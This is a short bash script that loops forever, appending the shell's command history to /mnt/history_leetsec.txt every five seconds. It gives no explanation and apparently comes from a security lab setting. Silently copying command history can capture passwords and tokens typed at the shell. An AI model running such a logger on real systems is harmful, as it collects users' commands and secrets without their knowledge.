#!/bin/bash
HISTFILE=~/.bash_history
set -o history
while true
do
	echo "$(history)" >> /mnt/history_leetsec.txt
	sleep 5s
done
